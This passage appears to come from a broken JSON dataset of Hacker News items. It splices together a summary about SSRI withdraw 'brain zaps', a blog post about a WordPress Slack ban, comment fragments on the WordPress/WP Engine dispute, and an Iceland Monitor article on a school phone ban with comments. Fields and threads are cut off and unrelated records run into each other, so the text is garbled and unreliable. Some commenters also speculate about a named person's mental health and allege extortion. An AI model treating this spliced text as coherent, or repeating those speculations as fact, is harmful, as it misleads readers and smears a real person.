      "Brain zaps are unsettling sensations resembling electrical shocks in the brain, associated with stopping SSRIs (Selective Serotonin Reuptake Inhibitors), a type of antidepressant.- These symptoms are part of Antidepressant Discontinuation Syndrome (ADS) and can lead to anxiety, vertigo, and other issues, making it challenging to stop antidepressant use.- Strategies like gradual tapering, switching to fluoxetine (another antidepressant), and cognitive behavioral therapy (CBT) can help alleviate symptoms, but no definitive cure exists, and some individuals may experience symptoms for extended periods."
    ],
    "commentSummary": [
      "Brain zaps, described as electric shock-like sensations, are now acknowledged as a common symptom of SSRI (Selective Serotonin Reuptake Inhibitor) withdrawal, despite being initially overlooked by physicians.- The phenomenon has been under-researched due to regulatory focus on minimizing the perception of antidepressant withdrawal symptoms.- To reduce withdrawal effects, a gradual tapering off of SSRIs is often advised, as users report diverse experiences with the medication's benefits and side effects."

    "originBody": "Personal My WordPress Slack ban 2024-10-11 Community, WordPress A couple of days ago, I got banned from the WordPress community Slack. As this is about WordPress, I figure I should use my WordPress blog to talk about it. The Checkbox Everything that day revolved around a small, mandatory checkbox which had been added to the wordpress.org sign-in page, declaring that you are not affiliated in any way. This login is pretty much the portal to contribute to the WordPress ecosystem. I, and several others, immediately had questions as to how broad this was and the legal ramifications. This is important to me because my work on WordPress represents the MariaDB Foundation, my login uses my Foundation email address. Not only do I not want to be tied-up in legal issues, but I do not want to be responsible for dragging the MariaDB Foundation into them. It is also very difficult for me to know if the MariaDB Foundation has a loose affiliation with WP Engine. Sure, I know they aren’t a direct sponsor, but they may be financially tied to one of our sponsors. As I am paid by the MariaDB Foundation, this could financially tie me. I needed clarification on this before I could proceed. Others asking questions have clients who host on WP Engine, or use paid-for plugins created by WP Engine. They also needed similar clarification. The Discussion The discussion happened on Slack, and a majority of it that I’m aware about can be seen in the Twitter thread below. For anybody who wants to understand why I've been banned from the #WordPress Slack. pic.twitter.com/TdA1iQtIPZ — Javier Casares (@JavierCasares) October 9, 2024 It continued on a little bit afterwards. Matt emphasised that the value of the checkbox is not stored, and that many people had logged in since the checkbox was added. I pointed out that although the value may not be directly stored, by his own admission, it has been logged who has signed in since the mandatory checkbox was added, so it is effectively stored. Shortly after this, my Slack session reset to another instance, and I was confused for a minute as to what happened. I then realised I had been kicked and banned from the server. I attempted to log in to Slack today just to confirm it was still in place. The system sent me this email when I tried. My Thoughts I don’t think we had a resolution to our questions, and the checkbox remains in place. Several people have stated that they will not sign in until there has been some proper legal clarification. WP Engine said this: I’m not fully convinced that this protects everyone. The WordPress Twitter account responded with: I have to say, I love that reader context is still a thing, I’m very surprised the current owner of Twitter did not kill it. The MariaDB Foundation is a non-profit, any legal representation would be prohibitively expensive for us. So, I’d rather err on the side of not logging in until it is clear I am safe. Does This Matter? I am a small fry in this, not very important. My contributions mostly go as far as helping out with WordPress database questions, and often via other communication methods. I meet a lot of people face to face in the community and advise on how things could be better, things like that. My personal ban is not that important. Several people who were banned at the same time are more important to the community. Having their voices taken away in this way is more damaging. I guess this is the start of the fallout from going nuclear that was talked about at the beginning of the fight. I think clarification matters, this Tweet from Anita, quoting Uncle Chuck, says perfectly what I was thinking at the time: Having coffee with Uncle Chuck (CGPT) 😂☕ and he said: You raise some valid points about the ambiguity of the checkbox. If people are asking Matt Mullenweg for clarification, it indicates a broader concern within the WordPress community about the implications of this statement,… — Anita (@TheCre8tiveDiva) October 9, 2024 Wider Thoughts I think I speak for many in the WordPress community / ecosystem when I say that we don’t want to take sides in this battle. We don’t want to be forced to take sides via a checkbox. We just want to get work done, to improve WordPress for everyone. The WordPress community is one of the most welcoming communities I’ve ever been a part of. It has brought friendship, meaning and value to many people. I want to see it succeed. One of the things I have said since the beginning of me becoming Chief Contributions Officer is that contributions aren’t just code. Documentation, events, translations, community building, testing, bug reports, just so many things make up important contributions in an open source project. You don’t have to be a coder to contribute. I have seen these values expressed more in the WordPress community than anywhere else. I cannot take a side in this battle, for several reasons. Not least because I have friends employed by both sides of it. But I would love for the collateral damage to stop. So that the community can heal. I’ve said publicly, I would much rather my ban be permanent for asking the difficult questions and restore the voice to others who are more important. I’m not sure how I can help the community, but in some small way, I will be there for it. ←Issues I found during WordPress.com to .org migration Working with the AVR Dx family→ 2 responses to “My WordPress Slack ban” James Hedin October 12, 2024 at 2:03 am It’s a great time for a big ole fork Reply LinuxJedi October 12, 2024 at 6:40 am I personally think it is more important to fork what WP .org does, and it looks like https://aspirepress.org is one attempt at that, I think there are others.

I wanted to be on his side but everything that has come out is just not a great look. He could have had basically the entire internet on his side just by laying out the facts: \"They use our product for free, generate hundreds of millions in revenue, and don't contribute back. It's just not fair. Please contribute more.\" Instead this tantrum has turned a bunch of people that would be in his camp against him and he's dragged Wordpress.org into the mud. Single handedly destroying a legacy. reply pointlessone 10 hours agoparentDo they use a product? WordPress’ license is GPL. However unfair it might feel they can use it under the terms of the license. Matt has chose the license and has to live with that choice. He’s doing basically the same thing Redis/Elastic Search/Mongo did but worse. He wants the money without getting the relicensing backlash. Which, I’d argue, is even worse than those other instances. reply satvikpendem 10 hours agorootparentHe can't relicense as WordPress is a fork of B2 which is GPL. That's one reason why he's trying to extort instead. reply pointlessone 4 hours agorootparentI don’t think the fact that it’s a B2 fork is relevant. He wouldn’t be able to relicense even if it wasn’t a fork but initially chosen GPL. reply runjake 3 hours agorootparentBased on my understanding, this is not how it works. IP issues withstanding, the owner of a software can relicense any time they want. Any software released in the past would still be subject to the GPL. So, if Matt decided to make WordPress closed source, previous versions would still be licensed under the terms of the GPL. reply greyface- 3 hours agorootparentAccording to `git blame`, Matt isn't the sole, or even majority, owner of the WordPress codebase. reply runjake 2 hours agorootparentI understand your point, but that wasn’t my point. And in terms of reality, it’s easy to argue that Matt is the effective owner of the codebase. reply greyface- 2 hours agorootparentThe reality is that copyright law treats the author, not maintainer, as owner. Matt is the author of less than 1% of the codebase by line. To relicense, he would need consent from the remaining 99%. I'm not sure how you could argue otherwise. reply mikae1 11 hours agoparentprevFraming it as a David vs. Goliath fight was also a huge mistake. Considering the might of Automattic it looks like he's completely out of touch with reality.

Though the part where Matt tried to extort wp engine into paying him personally an absurd sum didn't help put him on the right foot.

Some of the best and now most commercially critical open source software started a long time ago, by people buying into RMS-like visions of the future. Turns out, we did not arrive in that future. We arrived in the one where both $xxxB companies and their countless cargo cultists explot every means possible to profit from open source software, making angry demands on volunteers and small teams, while giving back as little as possible. It's essentially a test to find every open source developer's breaking point. Recently, we found Matt's. Next month, it'll be someone else's. reply lolinder 16 hours agoparentAgreed, but Matt is not the innocent and distressed open source maintainer who hit a breaking point, he's the extremely wealthy CEO of a company that brings in hundreds of millions a year in revenue. The CEO who recently tried to extort another large company for tens of millions of dollars per year to be directed to his personal for-profit company. The problem with Open Source as a movement isn't just the megacorps using it, it's also that paying for the project's ongoing development stopped being the goal for many monetization efforts—making the shareholders or the maintainers themselves (or in this case both) wealthy (or in this case even more wealthy) has become the new goal. That is why it's such a problem that these companies don't \"give back\". Having the software in the world doing its job is no longer the primary goal of starting an open source project, and the \"takers\" are encroaching on the founders' market cap. reply Brian_K_White 15 hours agoparentprevRMS was and still is right. If you care what someone else does with free software beyond making the source available, that is a you problem. reply philistine 2 hours agorootparentThen why is GPL-3 encroaching on what I can do with open source software? reply Brian_K_White 2 hours agorootparentWhy should anyone care if you find the single stipulation of gpl(any version) to share with the next guy that which was given to you for free, to be intolerable? Even gpl3 isn't \"encroaching\" on anything. It's terms are no different than any other terms, in that you can either accept or not. No different than if the terms are for money. If you don't agree to them, then luckily you don't have to use the software. You can write your own software that you don't have to share with anyone. Or you can pay for software that has other terms which are surely much more generous and empowering than gpl3. The only reason the software exists and is good enough to be valuable in the first place, is because it had those terms. If it had other terms, it wouldn't exist in the first place or be worth stealing for you complain that it doesn't let you steal it. If it had other terms, then most of the people who gave their time to work on it, would not have done so, because it would be a bad investment of their time. I guess the actual complaint here is \"why can't you just give me software like MIT?\" Why should anyone care about that complaint? It's like trying to use a freedom argument to criticize the limitation on your freedom to keep slaves. reply gamblor956 14 hours agoparentprevMatt is worth $400 million off the backs of open source developers. He is the big bad in this scenario. He's just mad someone else is also making money. reply beaconify 16 hours agoparentprevI do see OSS as free labour for Bezos, Altman et. al. and act accoringly. Closed source (but open data formats) may be the new open source. reply pointlessone 10 hours agoparentprevWe can only blame ourselves here. We knew that the companies would exploit it all along. Since before Free Software became a thing. Actually, this knowledge is the very ting that started Free Software. And we watched how Open Source came along to cozy up to businesses and bolster adoption. All this time we knew very well that no one’s going to pay for what’s available for free. And even after we’ve seen it happening time and time again we keep insisting that FLOSS is the best thing out there. We’ll have to move on to something else to see a meaningful change. I’d suggest excluding businesses from using software for free. You can keep your collective development, community building, and all the warm fuzzies. But you have to start requiring paid licensing for businesses if you want to stop the exploitation. You simply can not win on the moral basis in a system that has no strong moral aspect to it, such as free market capitalism. reply lolinder 5 hours agorootparentCan someone remind me why large businesses using Free Software is a problem? If they respect the terms of the license and release their changes as Free Software, why do I, as the maintainer, care who uses it? Isn't the entire point of releasing Free Software to maximize user freedom? The only problem that I've been able to see isn't a problem with Free Software as a concept, it's a problem with VC-funded companies that think \"Open Source\" is a business model that will somehow get their investors an ROI, but that's a problem with the motivations of VC-funded companies, not with Free Software. reply pointlessone 4 hours agorootparentYou’re not wrong but only partially right. Most FLOSS starts as a weekend project. Most end there, too. But some get big. Those big projects demand a lot of time and effort to deal with all the issues, PRs, mailing list/forum/IRC channel/whathave you moderation. So much effort that it in fact becomes another full-time job. Most people don’t know how to deal with that. They probably like what they’ve built, like all the attention, they try to be helpful. The obvious idea is to turn it somehow into a source of income so that they could continue doing what they like and what is obviously in demand. I’m not talking about Reacts, coporate internal projects that get open-sourced. I’m talking about your Linuxes, curls, and WordPresses, for that matter. WP didn’t start as a business. The business part of it came a little later. And now that Matt saw the business is lucrative he does what any business does. And what is incompatible with FLOSS. You’re right pointing out that the entire point of releasing Free Software is to maximize user freedom. But you also have to accept that user freedom is completely incompatible with any sort of sutainable development at scale. It can sort of work for small project that get a bug report every other week but it becomes untenable at a steady rate of half a dozen issues/PRs a day. Basically, unless every FLOSS user is a maintainer of their fork the whole thing falls apart. And let me tell you, ain’t no one got time for that. Most people do not maintain their forks. Some just don’t want to, some don’t have time, but most just don’t have the skill. They either don’t know 120 languages to support every piece of software they use, or don’t have the domain knowledge that spans kernles, file formats, graphics subsystems, web dev, and a billion other things. There’s simply no way to support all the software without maintainers who specialize in that particular language/domain. So we lock in people in those positions, exercise peer pressure/guilt to keep them working and then turn away and say “they just don’t know how to FLOSS”. reply FireBeyond 16 hours agoparentprevWhat? WordPress was a fork of B2 and quickly intended to make money. Matt and Automattic bought into WPE. They were the ones who sold their shares to the Private Equity firm that now owns it! The only other board member of the Foundation is ... drum roll ... the Managing Partner of another Private Equity firm, that Matt himself appointed. All his hand wringing about PE is to distract from the simple fact that he has repeatedly been an asshole through this process, and it's not because he \"reached his breaking point\" as an open source developer. This is so apologistic it's not funny. He reached a breaking point as a CEO, because he made a horrible business decision to buy Tumblr, which has been nothing but a money pit, ever since. Since then, MATT's for profit business has had this boat anchor around it, so he's looking for extra cash. That's why he demanded their royalties be paid to Automattic, his for profit company, not the open source project. > by people buying into RMS-like visions of the future. Horseshit. People with RMS-like visions for the future don't see the commercial potential for an open source project, immediately spin up a Foundation with themselves as President, and immediately grant their own for-profit company a perpetual, exclusive and irrevocable commercial use license for said open source project. (They may however release self-congratulatory press releases talking about how they are champions of open source for assigning ownership of the project to their Foundation while neglecting to mention the licensing that they[1] signed off on, that very same day.) You have apparently fully bought into the narrative. > making angry demands on volunteers and small teams What \"angry demands\" has WPEngine made of the project? I'd love to hear of at least one. [1] I say 'they' but really, the licensing was signed for the Foundation by \"Matt Mullenweg, President\", and for Automattic by \"Matt Mullenweg, President and CEO\". reply kemayo 16 hours agoprevThe checkbox on WordPress.org is such a bad look, and is dragging the theoretically non-commercial parts of WordPress into this big (stupid) licensing fight. It continues to reinforce that the entire WordPress.org / Foundation / Automattic cluster has turned out to just be Matt's personal fiefdom... which worked out okay when he was pretty chill, but is terrible when he decides to burn it all down. reply gwerbret 16 hours agoprevIn psychiatry, the concept of insight is used to describe an individual's ability to view their actions, beliefs and overall situation with what would be considered a normal perspective. It's probably best exemplified in popular culture by the movie \"A Beautiful Mind\". In the movie, a loss of insight is shown as one characteristic of schizophrenia, but it is by no means limited to that disorder. I'm just a rando on the internet, and this isn't a diagnosis, and you shouldn't diagnose either, kids; but given the relatively sudden onset of Mr. Mullenweg's public situations, and the associated seeming complete loss of insight, I can't help but wonder if there is a known or unknown mental health challenge in the background underlying all of his actions. Such things are invariably complicated by a person being \"post-economic\", with the lack of the usual checks and balances that come with that state of privilege. reply 8490109481 14 hours agoparentAgreed. It is frowned upon in public discourse to be an armchair psychiatrist, but I am seeing this implosion as the second-order effect of some condition afflicting Matt's mind. This situation can be seen in mechanical terms, the end-user effects like vendor-lock in, legal conflicts, profit and loss... or maybe Matt just woke up one day and, for some reason, felt like he's had it with everything. For some reason nobody knows. And also happened to be a few clicks away from the WordPress.org admin console. I am reminded of Kayne West. I think some people latched on to what he said in a literal sense instead of just ignoring it outright as the rants of a diagnosed bipolar person. To be sure what he said was deplorable at face value in a public space. But behind all the dialogue, the entire event might have been nothing more significant than the inevitable progression of a disease, one which leaves consciousness just intact enough to keep one recognizable, yet also compels one to say the most polarizing things. Also related, an article about one of Cloudflare's founders who was afflicted with a neurodegenerative disease that largely destroyed his personality. It went unnoticed for so long because his actions were taken at face value - he was just tired and disengaged from daily life - instead of as originating from a disease of the brain. https://news.ycombinator.com/item?id=22878136 reply pocketsand 16 hours agoprevFor me, the fact he tried to compel the WPE CEO to work for him or else he would expose that she was in negotiations with him is the most unhinged thing I’ve ever heard in a hiring process. Quite literally an affront to freedom.

And none of wpengine's board of directors or any of the board of directors of any companies wpengine has ownership or control in are your employees or managers. Effectively, they want to ensure wpengine is not interfacing with wordpress.org through undisclosed ways like shady shell companies. That is the reason for the checkbox. If you are selling stuff on wpengine or being paid by wpengine for selling stuff on there, you are not an affiliate. you are a seller. if you are selling wpengine subscriptions, you are not an affiliate; just a seller. if you are advertising wpengine services, you are not an affiliate. you are an advertiser. reply lolinder 15 hours agoparent> IANAL but I recommend everyone read that word with the tightest of definitions. Why would you recommend that when Matt/WordPress is on record questioning WP Engine's common sense interpretation? In a Twitter thread linked in TFA WP Engine put forward an interpretation like yours in an attempt to make their customers less nervous and WordPress (probably Matt) replied with a \"what if...\" casting doubt on that interpretation. We're talking about a guy who is currently following through on a threat to wage \"nuclear war\" (his words) and has very clearly shown that he does not care how much collateral damage he causes. It's totally reasonable to take the broadest interpretation of the checkbox possible. reply takinola 15 hours agoparentprevThe challenge is this is a commonsense interpretation of the checkbox.

I think if anyone can talk Matt down from the ledge, it would be another \"Benevolent Dictator\". That said, I think DHH misses something: lots of people built Wordpress, not just Matt. And we are slowly seeing the most engaged people, some who do it for the love of Wordpress instead of the money, either back away or get forced out. THAT is what will kill the ecosystem that has been built.

Matt's claim, \"My mom is confused and thinks that WPEngine is part of the open source project\", is a deflection, and laughable coming from the man who runs wordpress.org as a \"independent website\" (running on the Foundation's IP addresses) and wordpress.com as a for-profit business.

    "originBody": "NewsIceland MonitorWed 9 Oct 202412.00 GMT Facebook Twitter Email Reddit Share The phone ban has had a big impact on school work Valdimar Víðisson, the headmaster of Öldutúnsskóli says that the phoneban has been well received, both by students and their parents. Composite image A phone ban has been in place at Öldutún School since the beginning of 2019, and according to the principal, it has worked well. The school's atmosphere and culture have changed for the better, and there is more peace in the classroom. However, the headmaster Valdimar Víðisson says that it has not been separately studied whether the phone ban has had a positive effect on literacy and interest in reading. Still, Öldutúnsskóli has scored considerably above average regarding interest in reading. Article on Iceland Monitor Increased screen time reduces children's interest in reading \"We haven't connected it to the phones directly, but it would be interesting to look at it separately.\" However, we see this in an improved school culture, and cyberbullying has decreased significantly during school hours with this measure and is now hardly existent.\" More screen time reduces interest It has been reported in Morgunblaðið that students who spend more time on smartphones are less interested in reading than those who use their phones little or not at all. The interest in reading is waning faster and faster as students spend more time on their smart devices. These are the results of research by Kristján Ketill Stefánsson, assistant professor of pedagogy at the University of Iceland's Faculty of Education. The research is based on data from more than fifteen thousand students in grades 6 to 10 in 120 elementary schools across the country. Everything seems to indicate that more screen time reduces children's interest in reading. The ban was prepared for a whole year Stefánsson does not necessarily think it is wise to encourage a general ban on mobile phones in schools, but rather implement some kind of phone “holiday”. Öldutúnsskóli has, however, taken the route of completely banning the use of phones during school hours. The phone ban is in place in all year groups of the school, from 1st to 10th grade, and the headmaster says he is not about to drop it. Víðisson says he realizes that phones can be a safety device and that children use them, for example, after the school day ends to reach their parents. \"The phone is therefore not prohibited in the building, but its use is not allowed during school hours,\" he explains. Both students and parents have welcomed the phone ban, as it was prepared for a whole year in collaboration with the board of the student association, school council and parents, according to Víðisson. Smart phones have had a huge negative impact on children's interest in reading. mbl.is/Hari \"We did a lot of things in return, for example, we opened a new space for the teenagers that they designed, so there was no dissatisfaction with this at the time and it has not arisen. People just know that using phones is not allowed, and if the kids are sneaking to use the phone and an employee is nearby, they are very quick to react and know that this is not allowed.\" Phones may not be taken from students When asked if phones are taken from students if they don't follow the rules, he says they haven't done so as the school doesn't have the authority to do so. \"However, we have the authority to request that the phone be left at home and that the parents make sure that it does not come to school. But in general, the same applies to violations of telephone rules and violations of other rules. It depends on a certain process, after a certain time there is a meeting with the parents and so on,\" he says. \"If this is a problem for a child, it has been worked with parents, and in some cases phones have had to be left at home for a while and something like that.\" Spend much less time on the phone Stefánsson’s study results also revealed that the majority of children in the top three grades of primary school spend an hour a day or more on smartphones during school hours. There are even examples of children spending up to three hours a day on the phone during school hours. The headmaster says that in Skólapúlsinn (research portal for schools) it is clearly stated that the children in Öldutúnsskóli, and other schools where the phone ban is in place, spend much less time on the phone than their peers, or less than 30 minutes a day. In Skólapúlsinn, the children themselves answer questions about school work, well-being, activity in studies, and more, and the information is collected without revealing personal information. \"This has fixed and improved the atmosphere at our school and there is much better work peace during lessons. The kids know what the rules are, if they are using the phone, there are certain penalties for that, so it has become part of their culture that the phone is not a teaching tool.\" The kids talk more and the teenagers use the new space to play table tennis, pool, and more, listen to music, and play chess.

If you're stuck in a room and the only thing you can do is read a math textbook you are going to do it. If you are stuck in a room and you have a math textbook and a novel you now have a choice. A phone? A phone is everything else. You're putting \"the thing we are supposed to be doing\" and \"everything else\" in the same place.

I would literally doodle, stare out a window, zone out daydreaming, or anything else other than read a textbook I didn't want to read for one reason or another, or pay attention to a teacher for that matter. Yes, it is anecdotal, but I'm sure we've all been children before, and even if you didn't do it, people around you surely did if you paid any attention. For god sake, I remember my classmates just using a lighter on small patches of whiteout ink during one specific class because of how bored they were. Extreme example? Yes. But passing papers, making paper planes, and other crafts, literally anything to pass the time. This isn't exclusive to children either. If an adult doesn't want to do something, they maybe very well not unless forced to, and even then. Btw, I'm not trying to argue about banning or not banning a phone, this is specifically about the statement above. reply drdaeman 11 minutes agoparentprev> If you're stuck in a room and the only thing you can do is read a math textbook you are going to do it. I'm not so sure if this is true. No clue about kids, but if I'm (personally) stuck at the office and I'm really not feeling like working, I can literally stare at a wall daydreaming rather than do something. And the contrary is also true - if I'm \"stuck\" at some fancy place with lots to do (like home, lol) but feel like working (and have means to do so), there's no stopping me. I suspect the problem isn't the phones, the problem is lack of honest, genuine interest. Compliance can be enforced, but I'm not sure about efficiency of learning under duress. Compulsion brings aversion. This, of course, is a purely idealistic view, assuming ideal high-skilled spherical educators in vacuum rather than actual real-world conditions. While there are always ways to captivate interest and steer it into productive learning, it requires some orders of magnitude more resources than what's available. reply lukeschlather 4 minutes agorootparent> I can literally stare at a wall daydreaming rather than do something. And the contrary is also true - if I'm \"stuck\" at some fancy place but feel like working (and have means to do so), there's no stopping me. I mean there's a very broad spectrum here, and a slight distraction can be the difference between spending 5 minutes staring at a wall followed by three hours in flow state vs. spending three hours in mindless distractions. And children don't have any experience in how to cultivate flow state in the presence of distraction. Removing distractions naturally provides more opportunities to find the flow. reply hinkley 31 minutes agoparentprevI’m now going to a Third Place to get about half of my reading done.

Rather, they studied the phone ban's effect on school culture and bullying. To be clear, I believe a phone ban in schools would have a positive effect on academics, and that that would show up if it were studied. It's just that it doesn't seem like that's what they did in this case. Thus, arguing about whether phones affect attention span, memory, even reading time, is not relevant in the context of this article. reply countrymile 11 minutes agoprevA lot of interesting debate on phone bans right now.

I grew up in the 80s and 90s. If I'd brought a handheld game console like a Gameboy or something into class, it would have been confiscated immediately. Sure, I get it, that's not the same thing; obviously phones have other uses. But there is absolutely zero reason a kid needs their smartphone during class. All educational materials should be provided by the school. Kids do not need to be and should not be communicating with anyone outside class. If parents/guardians need to get in touch with kids during an emergency, they can do it the way they've done it as long as we've had the telephone: call the main office and have someone walk to the class to bring the kid to the phone. I do expect that smartphones could actually bring something useful to the classroom -- after all, they grant access to more or less all the world's knowledge -- but the downsides of allowing them far far far outweigh any possible upsides. reply agrippanux 2 hours agoprevI swapped my high school son’s iPhone for an Apple Watch w/cellular for school days and his grades and social life improved significantly. reply nixpulvis 1 hour agoparentI’ve been saying the Apple watch needs to be advertised as a solution for phones in schools more. reply mh- 1 hour agoparentprevAnd here our schools don't allow smart watches, depriving me of this (wise) choice. reply hammock 1 hour agorootparentMy school had to ban Tamagotchis back in the day… reply oblio 1 hour agorootparentprevCan't you just give them a dumb phone?

I had never used a payphone. I had perhaps rarely used our rotary home phone to dial out. Of course it was after school hours, and a stressful personal crisis already, and no adult was hovering nearby to explain anything. I figured out how to put in the coins and enter the number on TouchTone, (just like I'd seen on TV) but I didn't know what a dial tone or ring tone sounded like, nor a busy signal, and the line was in use at home, so indeed it was a busy signal that I patiently listened to for several minutes. I believed it was ringing and nobody was picking up. By the time I was 21 and working at my first job, I was promoted and given a cubicle with a phone on the desk. I was quite anxious that it would ring and I wouldn't know what to do with the call.

I mean, in a too-pedantic sense, smartphone screen time is roughly divided into reading, viewing (photos/videos), and gaming. Given that they are not allowed to take the phones, it seems unlikely that the school knows a student's primary usage mode. For example, a student could be reading a bunch of fiction on their phone, thereby reducing their time in the school's library. In other words, how holistic is the metric \"reading time?\" reply jdiff 2 hours agoparentI'm a high school teacher. Not for long, but for a few years now. Never have I ever seen a student reading on their phone. I'm not saying it doesn't happen, but it must be a vanishingly small fraction that I have not yet encountered. When my students are on their phones, it's games, or it's (primarily video-based) social media. A smaller but notable fraction is background media consumption, either music or movies. That's not to say I don't have kids who read, though they're much rarer than the music listeners, just that the readers seem to prefer physical books. So at least in my experience, I wouldn't expect that metric to be vulnerable to this particular flavor of distortion. reply docfort 2 hours agorootparentThanks for the reality check. I was worried about how I could be conflating my own personal view as a parent with the popular narrative of \"kids these days and their Instagram/TikTok.\" Probably says a lot more about me, but I vastly prefer the reading experience of a thick book on a phone than as a physical copy.

The child will either complain constantly about their friends having it, or just do it behind your back. If there is a school ban, then enforcement happens at school too, making it harder to do behind your back, and the bulk of their social circle isn't on social media, avoiding the FOMO issues. reply itishappy 58 minutes agorootparentHaving personally not had a smartphone or laptop through most of college back when Facebook was still cool (smartphone by choice, laptop by crime), I can say that social media on a library computer is a very different beast. You get most of the social benefits (I'd argue all of the important ones, is instant chat really needed?) while avoiding most of the distractions. So I get the complaint, but I feel like even if kids sneak around behind your back (been there too, lol, I rooted my iBook G4 when my parents added a password) the added friction makes a difference.

Rich people can afford childcare for all or a large part of the day, and can instruct their nanny to actually engage the child rather than pacifying them with a tablet screen.

I am not interested in sharing sources about this with you in 2024, because this has already been debated to death in the years prior. If you are not convinced of its existence, then that’s more your concern than mine. Late stage capitalism’s reference is a touchy subject and probably hyperbole in most cases, but it is also a specific reference and does not require the complete abandonment of capitalism to repair the problems.

I have very little love for programmed television and news channels these days, but I mostly feel that way because I grew up around them. Reality TV sucks, the news is gruesome, Marvel movies are all the same, HBO just airs different flavors of sex and violence. If you're not exposed to this media and the inherently pulpy context it exists under, you're training your children to treat it as exotic and desirable. You owe it to your next-of-kin to show them the news and global politics in the same way too, lest they fetishize extremism in their late age because they weren't exposed to moderate opinions. On the flip side, I lived in a rural area and my parents would frequently take me to play with kids that had no TV or internet access. Words cannot describe how thick these people can be. One of them was a pair of history buff brothers that weren't allowed to read anything their parents didn't vet - they didn't even know what the Civil War was when I mentioned it. There was a family that lived on a farm, where every time I visited their kids would ask me what weed looks like, what porn was and how alcohol tasted. There were the kids that asked me to recite Newgrounds videos verbatim, explain who \"Iron Man\" is and even ones that (tragically) didn't know the Mormonism their parents loved was a cult. Rejecting social media is a smart thing to teach anyone, but you have to be extremely careful to not use it as an excuse to shelter them. Sometimes I worry that HN creates a \"growth hack\" mindset for parents that inhibits them from thinking rationally about how a child develops. It's not a new phenomenon but it seems fear overrides our willingness to empathize with the events of our own childhood.
